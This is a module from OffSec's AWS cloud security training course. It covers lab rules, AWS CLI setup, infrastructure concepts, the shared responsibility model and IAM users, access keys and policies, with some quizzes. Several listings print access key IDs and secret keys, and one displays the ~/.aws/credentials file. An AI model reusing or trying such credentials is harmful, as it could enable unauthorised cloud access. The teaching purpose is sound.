Many modern organizations deploy their applications using some type of _cloud architecture model_. As the popularity of cloud infrastructure grows, _public cloud providers_ continuously add new capacities to their services. This growth in cloud usage also introduces new attack vectors that we need to consider when creating and managing applications in a cloud model.

This Learning Module introduces [_Amazon Web Services_](https://docs.aws.amazon.com/whitepapers/latest/aws-overview/introduction.html) (AWS), currently one of the most popular [Public Cloud Providers](https://csrc.nist.gov/glossary/term/cloud_provider). First, we will review some general concepts of the AWS platform. Next, we'll examine the most common products and services. Finally, we will introduce some security concepts we need to remember when evaluating the risks of public cloud deployments.

To work with the labs and exercises, we'll also introduce the new cloud labs feature.

In this Module, we will cover the following Learning Units:

- About the Cloud Labs
- Overview of AWS
- Getting Started with AWS
- Security and Best Practices

## 6.1. About the Public Cloud Labs

Before we jump in, let's run through a standard disclaimer.

This module uses OffSec's Public Cloud Labs for challenges and walkthroughs. **OffSec's Public Cloud Labs** are a type of lab environment that will complement the learning experience with hands-on practice. In contrast to our more common VM labs found elsewhere in OffSec Learning materials (in which learners will connect to the lab through a VPN), learners using the Public Cloud Labs will interact directly with the cloud environment through the Internet.

OffSec believes strongly in the advantages of learning and practicing in a hands-on environment, and we believe that the OffSec Public Cloud Labs represent an excellent opportunity for both new learners and practitioners who want to stay sharp.

Please note the following:

1. The lab environment should not be used for activities not described or requested in the learning materials you encounter. It is not designed to serve as a playground to test additional items that are out of the scope of the learning module.
    
2. The lab environment should not be used to take action against any asset external to the lab. This is specifically noteworthy because some modules may describe or even demonstrate attacks against vulnerable cloud deployments for the purpose of describing how those deployments can be secured.
    
3. Existing rules and requirements against sharing OffSec training materials still apply. Credentials and other details of the lab are not meant to be shared. OffSec monitors activity in the Public Cloud Labs (including resource usage) and monitors for abnormal events that are not related to activities described in the learning modules.
    

Caution

Activities that are flagged as suspicious will result in an investigation. If the investigation determines that a student acted outside of the guidelines described above, or otherwise intentionally abused the OffSec Public Cloud Labs, OffSec may choose to rescind that learner's access to the OffSec Public Cloud Labs and/or terminate the learner's account.

Progress between sessions is not saved. Note that a Public Cloud Lab that is restarted will return to its original state. After an hour has elapsed, the Public Cloud Lab will prompt to determine if the session is still active. If there is no response, the lab session will end. Learners can continue to manually extend a session for up to ten hours. The learning material is designed to accommodate the limitations of the environment. No learner is expected or required to complete all of the activities in a module within a single lab session. Even so, learners may choose to break up their learning into multiple sessions with the labs. We recommend making a note of the series of commands and actions that were completed previously to facilitate the restoration of the lab environment to the state it was in when the learner left. This is especially important when working through complex labs that require multiple actions.

## 6.2. Overview of Amazon Web Services

This Learning Unit covers the following Learning Objectives:

- Learn about Amazon AWS origin
- Explore AWS infrastructure and services
- Understand how the shared responsibility model separates responsibilities in the cloud

## 6.2.1. Accessing the Lab

In this Learning Module, we will interact with an AWS environment through the [_AWS Management Console_](https://aws.amazon.com/console/) and [_AWS Command Line Interface_](https://aws.amazon.com/cli/) (CLI).

The AWS Management Console is a web application to manage our AWS resources. We can access the Management Console using a web browser. In each of the following labs, a username and password will be provided for authentication.

AWS CLI is software we can install in our operating system to manage our AWS cloud account from the command line.

We can install AWS CLI in several operating systems. For this Module, we will use a Kali Linux virtual machine to install and configure AWS CLI.

Kali Linux includes the AWS CLI tool in the official repositories, so the easiest way to install it is by using the **apt** package manager. If we are running kali as a low-privileged user, we'll need to include **sudo** at the beginning of our commands to run with root privileges.

First, we'll run **sudo apt update** to ensure that Kali's repositories are up-to-date. Next, the command **sudo apt install -y awscli** will install the AWS CLI tool and dependencies without prompting a confirmation dialog (-y).

Once the installation completes, we can execute the **aws** tool. To test that it's working as expected, let's run **aws --version**, which will return the current version of the AWS CLI tool.

```kali-shell
kali@kali:~$ sudo apt update
[sudo] password for kali:
...
Fetched 64.0 MB in 1min 17s (832 kB/s)
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
434 packages can be upgraded. Run 'apt list --upgradable' to see them.

kali@kali:~$ sudo apt install -y awscli
...
The following NEW packages will be installed:
  awscli docutils-common python3-awscrt python3-docutils python3-jmespath python3-roman
(Reading database ... 461429 files and directories currently installed.)
...

kali@kali:~$ aws --version 
aws-cli/2.9.19 Python/3.11.2 Linux/6.1.0-kali7-amd64 source/x86_64.kali.2023 prompt/off
```

> Listing 1 - Installing AWS CLI in Kali Linux.

To interact with our AWS environment using AWS CLI, we will use a pair of credentials known as _Access Keys_. Access keys are long-term credentials that consist of two parts: an _Access Key ID_ and a _Secret Access Key_. Just like a username and a password, we need to use them to authenticate and sign programmatic requests to AWS, meaning we need to manage them securely. We'll receive access keys when we start a lab. Later, we'll interact with our AWS account to create our own users and access keys.

For general use, the **aws configure** command is the fastest way to set up our AWS CLI to use the access keys we specify. We'll be prompted for the _Access Key ID_ and the _Secret Access Key_. For now, we'll leave the other parameters blank, so the default values will be used. We will set the _Default region name_ in the following labs.

```kali-shell
kali@kali:~$ aws configure
AWS Access Key ID [None]: ASIAQOMAIGYUQOXBV3HR
AWS Secret Access Key [None]: 5SNx1/jiDT2it0atdPf11bxZgcjGUIqvl8cyiavD
Default region name [None]:
Default output format [None]:
```

> Listing 2 - Configuring AWS CLI to use Access Keys

Next, we can run the **aws sts get-caller-identity** command to confirm that we can interact with the AWS API using the provided identity. A JSON response with the user information is proof that the credentials were valid.

```kali-shell
kali@kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/OffsecLearner"
}
```

> Listing 3 - Validating Communication with AWS API

For now, let's start this lab to retrieve credentials and validate the access through the Management Console. We will use this interface in a following section.

## 6.2.2. About Amazon Web Services

Amazon Web Services began in the early 2000s and became publicly available in 2006 by offering managed IT infrastructure to enterprises through web services. The idea behind this is that any business can deploy an IT service at any time in a self-service manner and only pay for the resources they use via a _pay-as-you-go model_. These features differentiated AWS from other managed IT service providers and began shaping the _cloud computing model_ as we know it today. Initially, businesses were skeptical about choosing a company better known for selling books and retail products as their IT service provider. However, that experience helped to envision a retail computing business, a new way of renting server power over the internet and paying as one would an electricity bill.

The first service available in AWS was _Simple Storage Service_ (S3). The idea behind S3 was to provide disk space for storing files over the web. A few months later, AWS released the computing service called _Elastic Cloud Computing_ (EC2). If an organization needed a publicly available server for deploying applications, they could deploy an EC2 instance, which is how AWS refers to _virtual machines_. In the following years, the service catalog of AWS continued to increase. As of 2023, there are 238 products available, meaning that the attack surface for targeting AWS environments has also grown with the time.

AWS' popularity also means that attackers are more interested in discovering attack vectors in this cloud environment since there are more potential victims to exploit. Occasionally, vulnerabilities appear in the AWS platform, and these are quickly patched throughout all customers. In fact, the vast majority of attacks succeed by exploiting misconfigurations by clients themselves.

From a security point of view, we need to develop a fundamental knowledge of AWS's core components and services. As we'll learn in subsequent sections, even though AWS is a cloud provider that manages the infrastructure, the customer also has some responsibilities for securing their assets.

## 6.2.3. AWS Infrastructure and Services

We have learned that AWS is a cloud provider that delivers IT services in a cloud computing model. To deploy these resources, AWS needs some infrastructure: among other things, physical locations to locate data centers, bare-metal servers, network and security devices, hypervisors, and software to orchestrate deployment, management, and billing of services. AWS infrastructure isn't confined to a single place or a single country. Let's analyze some of AWS's global infrastructure.

[_AWS Data Centers_](https://aws.amazon.com/compliance/data-center/data-centers/) are dedicated buildings for housing computers along with other components required for their continuous operations, such as environmental control systems, power grids, energy production systems, fire suppression systems, and security.

[_Availability Zones_](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html#concepts-availability-zones) (AZ) are isolated zones of one or more data centers within a geographical area. To ensure high availability, we should distribute our resources across multiple AZs. Ideally, the distance between Availability Zones is far enough to reduce the risk of all going down in case of any local disaster or disruption, but close enough to provide low latency between them.

[_AWS Regions_](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html#concepts-regions) are geographical areas with two or more AZs. AWS distributes Regions worldwide, isolating them from one another by very long distances. Therefore, any problem happening in one Region shouldn't affect other Regions.

![[OffSec/Cloud/Cloud Essentials/z. images/7078ed5a9847ff849e29085a631d39e9_MD5.jpg]]

Figure 1: Regions and Availability Zones

Tip

The AWS cloud now spans 99 Availability Zones within 31 Regions around the world.

AWS Regions and Availability Zones have a standard naming code that we will need to specify when interacting with AWS programmatically. The following table shows some examples.

|Region Code|Region Name|Availability Zone|
|---|---|---|
|us-east-1|N. Virginia|us-east-1a, us-east-1b, us-east-1c, us-east-1d, us-east-1e, us-east-1f|
|us-east-2|Ohio|us-east-2a, us-east-2b,us-east-2c|
|us-west-1|N. California|us-west-1a, us-west-1b, us-west-c|
|eu-west-1|Ireland|eu-west-1a, eu-west-1b, eu-west-1c|
|ap-east-1|Hong Kong|ap-east-1a, ap-east-1b, ap-east-1c|
|sa-east-1|Sao Paulo|sa-east-1a, sa-east-1b, sa-east-1c|

> Table 1 - AWS Regions and Availability Zones Examples

Sometimes, we require our services to be as close to the end-users as possible for quick access and low latency demand, and the locations of AZs are not enough to accommodate these types of services.

[_AWS Edge Locations_](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/HowCloudFrontWorks.html) bring cache and network services closer to the end-user to deliver content with lower latency.

[_AWS CloudFront_](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Introduction.html) uses Edge Locations to deliver _content caching services_.(https://aws.amazon.com/what-is/cdn/)

[_AWS Route 53_](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/Welcome.html) also uses Edge Locations to provide DNS services.

[_AWS Local Zones_](https://aws.amazon.com/about-aws/global-infrastructure/localzones/features/) bring compute, storage, database, and other select AWS services close to large populations and industrial and IT centers. Local Zones enable edge computing applications.

[_AWS Wavelength Zones_](https://aws.amazon.com/wavelength/features/) provide edge computing for mobile applications by directly connecting to the carrier service providers' (CSP) 5G networks.

Most of the services we deploy require us to choose an AWS Region, and in some cases, also an AZ. We cannot specify the physical data center location, and as a matter of fact, we don't know it either. Due to the security and privacy of customers, AWS doesn't disclose the data center's precise location, although this information is sometimes leaked.

Let's sign in to the AWS Management Console and deploy an instance of a service while selecting the Region and Availability Zone. The Management Console is a web application where we can deploy and manage all our resources inside the AWS cloud. To sign in, we first need to open a browser from our local computer with internet access and navigate to [https://console.aws.amazon.com](https://console.aws.amazon.com)

![[OffSec/Cloud/Cloud Essentials/z. images/76cd39853b33493b9339158f10ec7efe_MD5.jpg]]

Figure 2: AWS Login Page

The sign-in form presents two user options: _Root user_ and _IAM user_. When a new AWS account is created, a Root user is registered with the email provided. The Root user has unrestricted access to everything. It's best practice to configure a strong password with _multi-factor authentication_ (MFA) for the Root user user and avoid using this account unless required and, instead, use IAM user accounts with the appropriate permissions. We will learn more about the _Identity and Access Management_ (IAM) service in a later Learning Unit.

In this module, we won't login as a Root user, so let's select the IAM user option. We'll need three pieces of information that were given when we started the lab: _Account ID_, _IAM user name_ and _password_.

Tip

An AWS Account ID is a 12-digit number, such as 123456789012, that uniquely identifies an AWS account. The account ID portion distinguishes resources in one account from the resources in another account.

First, we enter the _Account ID_, then click the "next" button. This takes us to another form, where we need to input the _IAM user name_ and _password_. After submitting the credentials, we're ready to proceed in the Management Console.

The first page presented to us is the _Console Home_, where we can find shortcuts to recently used services, documentation, and the overall status of our account.

![[OffSec/Cloud/Cloud Essentials/z. images/32d88a46a660023f86c736961cbb44a8_MD5.jpg]]

Figure 3: AWS Console Home Page

Caution

The home page layout may appear different than the image above if AWS updates it in the future.

At the right of the top menu, next to the username, there is a select field with _Region_ selected; by default, the last used Region is selected. We will leave the current Region as _N.Virginia (us-east-1)_.

Next, let's click on the _Services_ tab located at the left of the top menu. We can browse all the services that AWS provides in this menu.

![[OffSec/Cloud/Cloud Essentials/z. images/d896ddb33159b264fc7cfd08205134f8_MD5.jpg]]

Figure 4: Services Menu. EC2 Service

Services are grouped into categories. The service we need is _EC2_, and we can find it inside the _Compute_ category by navigating to _Services_ > _Compute_ > _EC2_.

![[OffSec/Cloud/Cloud Essentials/z. images/c7c95a500ec41558c6bdac8b2d965c6a_MD5.jpg]]

Figure 5: EC2 Dashboard Page

The first page that loads is the _EC2 Service Dashboard_. On the left side menu, we'll find several options that are features of the EC2 service. We don't need to worry about knowing all these features, since we'll analyze more of this service in a later Learning Unit.

Let's click on the _Instances_ option under the _Instances_ features sub-menu. Previously, we learned that AWS virtual machines are referred to as EC2 instances. Currently, we don't find any EC2 instances deployed, as indicated by the "No instances" message. Let's deploy one by clicking the _Launch instances_ button.

![[OffSec/Cloud/Cloud Essentials/z. images/30de90ebf049ce0bb62f0678307cbd1d_MD5.jpg]]

Figure 6: EC2 Instances Page

For quick deployment, the only required field we must edit is _Key pair name_ under the _Key pair_ section. We can select the option _Proceed without a key pair (Not recommended)_. By using this setting, we won't be able to connect remotely to our instance via _Secure Shell_ (SSH), but it is not a problem for this lab.

![[OffSec/Cloud/Cloud Essentials/z. images/af1c4abc3dedc6114787576bd0368870_MD5.jpg]]

Figure 7: Quick Launch EC2 Instance Settings. Key Pair

Next, under _Network Settings_, we want to change the _Subnet_. To modify that field, we need to click on the _Edit_ button. After that, we can choose a _Subnet_, and as we can confirm, each _Subnet_ is in a different Availability Zone.

![[OffSec/Cloud/Cloud Essentials/z. images/aa2e490fcaee084bee5b98d375c7b47f_MD5.jpg]]

Figure 8: Quick Launch EC2 Instance Settings. Availability Zone

AWS creates a default network environment in the cloud for quick deployment. We will review more about networking in the next Learning Unit. For now, we can select the _us-east-1a_ AZ.

We can leave the rest of the fields with the default values and click the _Launch instance_ button. Next, let's return to the _Instances_ page from the left menu; we could also click on the _View all instances_ button that appears after launching the instance.

The newly-created instance now appears on the list. We can click on the instance and explore the details. After we finish analyzing, we can delete the instance by right-clicking on it and selecting _Terminate instance_.

![[OffSec/Cloud/Cloud Essentials/z. images/da2188580415ab9387366f610f5e22b1_MD5.jpg]]

Figure 9: Terminate EC2 Instance

The purpose of using the management console in this section is to understand how easy it can be to deploy some services with default parameters. Some services, especially those that have been around for many years, may use default parameters that align with security best practices - however, this is not the case for all services, creating opportunities for misconfigurations to occur and cause vulnerabilities in the cloud environment.

#### Labs

1. While obtaining info from a target we get the following output for the reverse lookup of the public IP address. From the output, can you deduce which AWS region the service deployed was? (Answer only with the region name in lowercase)

```kali-shell
kali@localhost:~$host 18.223.162.241
241.162.223.18.in-addr.arpa domain name pointer ec2-18-223-162-241.us-east-2.compute.amazonaws.com.
```

Answer

2. What is the name of the AWS service that provides a global content delivery network to securely deliver content with low latency and high transfer speeds? (Answer only with the service name. Capitalize the first letter)

Answer[View hints](https://portal.offsec.com/learning-paths/cloud-essentials-167535/learning/introduction-to-aws-51813/security-and-best-practices-51874/example-attack-against-aws-cloud-51818#)

3. Write True or False. We can deploy an EC2 instance closer to users in New York by selecting the New York Edge Location when deploying.

Answer[View hints](https://portal.offsec.com/learning-paths/cloud-essentials-167535/learning/introduction-to-aws-51813/security-and-best-practices-51874/example-attack-against-aws-cloud-51818#)

## 6.2.4. Shared Responsibility Model

Now that we've learned the core components of AWS infrastructure, we may wonder who is responsible for the security of the assets in the cloud: Is it AWS as the service provider, or ourselves as the customers? The answer is both, and we can find the outline of those responsibilities in the [_Shared Responsibility Model_](https://aws.amazon.com/compliance/shared-responsibility-model/). We will cover the main points of the shared responsibility model in this section, although it is recommended to check the original documentation in case of any future updates.

Under this model, AWS is responsible for the "Security of the Cloud". They protect the infrastructure where the customer's cloud resources run: hardware, software, network, and facilities. The software layer refers to the components of software AWS uses to orchestrate the deployment of resources. Customers interact with some elements of this software layer, like the Management Console, but most of this layer is for internal provider use only.

As customers, AWS end users are responsible for the "Security in the Cloud," meaning we must protect our resources deployed into the AWS infrastructure. This scope varies depending on the type of service that we are deploying in the cloud.

For example, let's imagine we launch an EC2 instance, i.e., a virtual machine. An EC2 instance is considered an [_Infrastructure as a Service_](https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-iaas) (IaaS). AWS is responsible for the physical server and the virtualization platform necessary to host the virtual machine. We are responsible for the operating system, the software we install on that instance, and the applications we develop. Consider we also launch a [_MySQL Relational Database Service_](https://aws.amazon.com/rds/mysql/) (MySQL RDS) instance, i.e., a database. RDS is considered a [_Platform as a Service_](https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-paas) (PaaS). AWS manages the hardware and operating system where the database resides. We are responsible for securing the database and the data within.

We are also accountable for configurations we make in the AWS platform to set up our resources. In the previous example, we probably won't need to publish the database on the internet. If we are going to deploy a mirror database, it is a good idea to launch it in a different Availability Zone. We are responsible for such configurations.

Besides the customer-provider relationship with AWS, we may also have other entities like partners and third-party providers in charge of managing and operating part of our cloud resources. This is important to keep in mind when designing our incident response process.

The shared responsibility model is not unique to AWS; we may also find similar responsibility clauses in other cloud providers. Reading these through before deploying any resource is a must. A good understanding of the shared responsibility model can help us in the _thread analysis_ of our assets in the cloud and prevent us from having false expectations of the service.

## 6.3. Getting Started with AWS

This Learning Unit introduces AWS core services and how to start interacting with them. We'll focus more on the security-related concepts and what to check for when assessing an AWS cloud infrastructure rather than deploying services from a cloud architect's point of view.

We'll begin by learning how to manage authentication and authorization in a cloud infrastructure. This is important because most attack vectors occur in this layer.

This Learning Unit covers the following Learning Objectives:

- Learn about Identity and Access in AWS
- Explore AWS compute services
- Learn about networking in AWS
- Introduce Storage Services in AWS
- Understand Database Services in AWS
- Learn about logging and monitoring in AWS

Throughout the labs and exercises, we'll be using the AWS CLI instead of the Management Console. In general, the Management Console is a great tool for cloud architects to start interacting with the AWS platform, but as pentesters, we should get more comfortable interacting directly with the AWS API using tools like the AWS CLI. This is also a valuable skill because, in real-life assessments, we're more likely to obtain credentials that only have permission to interact programmatically.

## 6.3.1. Accessing the Identity and Access Management Lab

We will use an AWS account and the AWS CLI to follow along with the commands and activities in the next section.

Caution

If you haven't already, review the _Accessing the Lab_ section at the beginning of this module for instructions on installing AWS CLI in a Kali virtual machine.

We will mostly use the AWS CLI to interact with our AWS infrastructure, although it is encouraged to review the corresponding actions and results in the Management Console as an extra mile activity.

Credentials for accessing the AWS Management Console and access keys for programmatical interaction are provided when starting the lab and they will be temporarily valid for a few hours. After that, we'll need to start the lab again to retrieve new credentials.

To follow along with the content in the next section, we need to configure the AWS CLI to use the newly-retrieved credentials. We'll run the **aws configure** command, entering the _Access Key ID_ and the _Secret Access Key_. We will be working in _Region_ **us-east-1** throughout this module, so let's set the _Default region name_ to that value, too. The last parameter we can leave blank, and it will default to _json_.

To validate that the credentials are working correctly, we can use **aws sts get-caller-identity**, which will only return a valid response if we are using valid credentials.

```kali-shell
kali@kali:~$ aws configure
AWS Access Key ID [None]: AKIAQOMAIGYUQOXBV3HR
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1
Default output format [None]:

kali@kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/learner"
}
```

> Listing 4 - Configuring AWS CLI and validate user.

For now, we'll simply start the lab to retrieve credentials and validate that we can interact with AWS API via the Management Console and CLI.

## 6.3.2. Identity and Access Management

Now that we've covered some ways of interacting with AWS, we learned that AWS provides a public API to which anyone with an internet connection can send requests. Therefore, there must be authentication (who is requesting?) and authorization (are they allowed to?) mechanisms to prevent anyone from accessing or modifying resources they shouldn't.

[AWS Identity and Access Management](https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html) (IAM) is the service that provides controlled access to AWS resources. IAM is critical from a security perspective. An excellent understanding of this service can avoid misconfigurations that could lead to a complete takeover of the cloud environment.

IAM mainly ensures that actions requested through the AWS API are securely authorized by authenticated identities. Some services may have additional features to control access in their specific contexts. For example, the EC2 service provides [_key pairs_](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html) and [_security groups_](https://docs.aws.amazon.com/vpc/latest/userguide/security-groups.html) to further control access to EC2 instances.

To start using AWS, we'll need an AWS account. We deploy and manage our services inside our AWS account, meaning it's like a container for all of our resources inside the AWS cloud environment.

When a customer signs up to AWS, their initial account is named the Root user. This Root user has unrestricted access to all resources inside the AWS account. Since this is a privileged account, it's strongly encouraged never to use it for everyday access. Instead, we should employ less privileged users.

IAM users are identities of people or applications that can authenticate and interact with the AWS API using a specific set of permissions. IAM users are initially created by the Root user of the account. Other IAM users with the proper permissions can then also create new users.

After starting the lab, we received credentials of an IAM user with high-privileged permissions. As we'll recall, it's a good practice to only use the Root user for an initial setup and use IAM users to manage the cloud environment following that. Let's follow security best practices. We'll pretend our current credentials belong to the Root user and create a new IAM user with admin privileges.

We can run **aws help** to review a list of available services. To create a user, we need to interact with the IAM service. Running **aws iam help** shows a listing of available subcommands for IAM and describe what they do. The **create-user** subcommand is the one we need. We can learn how to use it by running **aws iam create-user help**.

```kali-shell
kali@kali:~$ aws help
NAME
       aws -

DESCRIPTION
       The  AWS  Command  Line  Interface is a unified tool to manage your AWS
       services.

SYNOPSIS
          aws [options] <command> <subcommand> [parameters]

       Use aws command help for information on a  specific  command.  Use  aws
       help  topics  to view a list of available help topics. The synopsis for
       each command shows its parameters and their usage. Optional  parameters
       are shown in square brackets.
...
AVAILABLE SERVICES
       o accessanalyzer

       o account

       o acm

       o acm-pca

       o alexaforbusiness

       o amp
...

kali@kali:~$ aws iam help
NAME
  iam -

DESCRIPTION
  Identity and Access Management (IAM) is a web service for securely con-
  trolling access to Amazon Web Services services. With IAM, you can cen-
  trally manage users, security credentials such as access keys, and per-
  missions that control which Amazon Web Services resources users and ap-
  plications can access. For more information about IAM, see Identity and
  Access Management (IAM) and the Identity  and  Access  Management  User 
  Guide .

AVAILABLE COMMANDS
  o add-client-id-to-open-id-connect-provider

  o add-role-to-instance-profile

  o add-user-to-group
...

kali@kali:~$ aws iam create-user help
NAME
  create-user -

DESCRIPTION
       Creates a new IAM user for your Amazon Web Services account.

...

SYNOPSIS
    create-user
  [--path <value>]
  --user-name <value>
  [--permissions-boundary <value>]
  [--tags <value>]
  [--cli-input-json | --cli-input-yaml]

...

--user-name (string)
  The name of the user to create.

  IAM  user,  group,  role, and policy names must be unique within the
  account. Names are not distinguished by case. For example, you  can-
  not create resources named both "MyResource" and "myresource".

...

```

> Listing 5 - AWS IAM Help Pages

The only required parameter is **--user-name**, which is the name of the user we will create. The username must be unique within the context of the AWS account.

Let's create a user named _labadmin_.

```kali-shell
kali@kali:~$ aws iam create-user --user-name labadmin
{
    "User": {
        "Path": "/",
        "UserName": "labadmin",
        "UserId": "AIDAQOMAIGYUW2ZOXLBZU",
        "Arn": "arn:aws:iam::123456789012:user/labadmin",
    }
}
```

> Listing 6 - Create labadmin IAM User with AWS CLI

We receive a response in JSON format with details about the newly-created user, which means that the action executed successfully.

We will no longer show the **help** command from this point. However, it's highly recommended to use it to learn more about the commands we'll use throughout this module.

Next, for the user to have access to the AWS Management Console, we need to create a _login profile_, which is a data type containing a password for the IAM user. We can create a login profile with the **create-login-profile** IAM command. The **--user-name** option is the name of the IAM user for which we'll create the profile. Using the **--password** option, we can set the password we are going to use. For good practice, we'll also use the **--password-reset-required** flag to force a password reset the next time the user signs in.

```kali-shell
kali@kali:~$ aws iam create-login-profile --user-name labadmin --password "pLEASE_Change__M3" --password-reset-required
{
    "LoginProfile": {
        "UserName": "labadmin",
        ...
        "PasswordResetRequired": true
    }
} 
```

> Listing 7 - Create Login Profile for labadmin IAM User

Let's test our newly-created credentials by logging in to the AWS Management Console. We can go to **https://console.aws.amazon.com/**, choose IAM user as the sign-in option, input the _Account ID_ we got when starting the lab, and click _Next_.

![[OffSec/Cloud/Cloud Essentials/z. images/76cd39853b33493b9339158f10ec7efe_MD5.jpg]]

Figure 10: AWS Login Page

We can also retrieve the account ID anytime from the output of the **sts get-caller-identity** command we learned previously in the _Accessing the Lab_ section. We can use the **--query 'Account'** parameter to retrieve only that value, combined with **--output text** to avoid having to parse and format the default JSON output.

Tip

The _Account ID_ is the same for all IAM users created under the same account.

Once inside the Management Console, we'll discover we're fairly limited to minimal administration tasks, such as querying user information and resetting the password. We can try to launch an EC2 instance, but authorization errors will prevent us from deploying anything. For now, we'll leave it like this. Later, we'll provide permissions to the _labadmin_ user.

We've provided access to the Management Console, but we also want the _labadmin_ IAM user to interact with AWS programmatically via the AWS CLI in this lab. To do this, we need to create "access keys" for the user with the **create-access-key** IAM command. The only required parameter is **--user-name**, which in our case is _labadmin_.

```kali-shell
kali@kali:~$ aws iam create-access-key --user-name labadmin
{
    "AccessKey": {
        "UserName": "labadmin",
        "AccessKeyId": "AKIAQOMAIGYU5MZBGT4F",
        "Status": "Active",
        "SecretAccessKey": "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",
        ...
    }
}
```

> Listing 8 - Create Access Key for labadmin IAM User

Caution

After we create access keys, we need to store them securely because we won't be able to retrieve them later.

Next, we'll configure the AWS CLI to interact with the AWS API using our newly-created access keys. Once again we'll use the **aws configure** command, but this time we'll create a profile for the _labadmin_ user with the **--profile** argument. This allows us to specify the access keys we want to use when interacting with the AWS API.

```kali-shell
kali@kali:~$ aws configure --profile labadmin
AWS Access Key ID [None]: AKIAQOMAIGYU5MZBGT4F
AWS Secret Access Key [None]: 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
Default region name [None]:
Default output format [None]:
```

> Listing 9 - Configuring AWS CLI to Use the labadmin User's Access Keys

To validate that the profile is created and configured correctly, we'll run **cat ~/.aws/credentials**. This shows the content of the file, and we can confirm that the credentials are configured under the _[labadmin]_ profile tag, while the credentials we configured previously are under the _[default]_ profile tag.

Next, to interact with the AWS API using the _labadmin_ credentials, we need to include the **--profile labadmin** argument to any command. For example, we'll run the **sts get-caller-identity** command using the profile argument, then run it again without using the profile argument to confirm that we're interacting with the AWS API with two different users.

```kali-shell
kali@kali:~$ cat ~/.aws/credentials
[default]
aws_access_key_id=ASIAQOMAIGYUQOXBV3HR
aws_secret_access_key=5SNx1/jiDT2it0atdPf11bxZgcjGUIqvl8cyiavD
[labadmin]
aws_access_key_id=AKIAQOMAIGYU5MZBGT4F 
aws_secret_access_key=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 

kali@kali:~$ aws --profile labadmin sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYUW2ZOXLBZU",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/labadmin"
}

kali@kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/learner"
}
```

> Listing 10 - Validating the labadmin IAM User Profile

Caution

When the **--profile** argument is not included, the AWS CLI tool will use the access keys configured under the _default_ profile.

Now, let's use the **iam list-users** command to list the IAM users, but this time we will include the **--profile labadmin** argument to use the _labadmin_ profile.

```kali-shell
kali@kali:~$ aws --profile labadmin iam list-users

An error occurred (AccessDenied) when calling the ListUsers operation: User: arn:aws:iam::123456789012:user/labadmin is not authorized to perform: iam:ListUsers on resource: arn:aws:iam::123456789012:user/ because no identity-based policy allows the iam:ListUsers action
```

> Listing 11 - Access Denied Error When Listing IAM Users with the labadmin Profile

As before with the Management Console, we receive an "AccessDenied" error when trying to interact using the _labadmin_ credentials. This occurs because, when we create an IAM user, it has no permissions by default, meaning we can't run any command except for [**sts get-caller-identity**](https://docs.aws.amazon.com/STS/latest/APIReference/API_GetCallerIdentity.html).

Caution

No permissions are required to perform the **get-caller-identity** operation. If an administrator attaches a policy to an identity that explicitly denies access to the _sts:GetCallerIdentity_ action, it can still perform this operation. Permissions are not required because the same information is returned when access is denied.

Before learning how to grant permissions to the IAM user, let's dig a little deeper into IAM and introduce some new concepts.

IAM identities can be users, user groups, and roles. We grant permissions to IAM identities. We have already created IAM users, so let's examine the other two. An [_IAM User Group_](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_groups.html) is a collection of users who share the same permissions. An [_IAM role_](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html) is an identity that an IAM user can temporarily assume to obtain its privileges.

In order to grant permissions to identities, we need to attach _Policies_ to them. A policy is an object, typically described in JSON format, that specifies permissions associated with an identity or resource. A policy can be as permissive as "Any identity can perform any action over any resource," or it can be as granular as "Only this identity can perform this particular action over these resources."

Caution

By default, IAM entities start with no permissions. The level of permissions we grant to identities through policies are entirely our responsibility.

AWS defines [six policy types](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#access_policy-types). Let's explore two of the most frequently used:

[_Identity-based Policies_](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#policies_id-based) grant permissions directly to an identity. The policy defines _what actions_ the identity can perform over _which resources_, and under _what conditions_. These are the most common type of policies we find in any AWS cloud infrastructure.

[_Resource-based Policies_](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#policies_resource-based) are permissions we define and attach to a resource, such as an EC2 instance. The policy defines _what actions_ can be performed by specific identities. We can use resource-based policies to segregate permissions further. However, not all services support this. For a detailed list, we can check AWS documentation.(https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_aws-services-that-work-with-iam.html)

![[OffSec/Cloud/Cloud Essentials/z. images/e50d0fb0010d5a4303670500351774f3_MD5.jpg]]

Figure 11: IAM Identities, Resources and Policies.

When we define a policy tied directly to an identity, we are defining an [_Inline Policy_](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html#inline-policies) for that identity. Inline policies should be avoided when possible, because they can become difficult to manage. A better approach is to create [_Managed Policies_](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html#aws-managed-policies), which are standalone policy objects that we can attach to several identities as needed.

A _Policy Document_ is a JSON document that describes a policy. The syntax is the same for both identity and resource-based policies. The following listing describes an example of a policy that grants permissions to execute any IAM actions to any resource. Let's analyze this policy's components.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:*",
      "Resource": "*"
    }
  ]
}
```

> Listing 12 - IAM Full Access Policy Document Sample

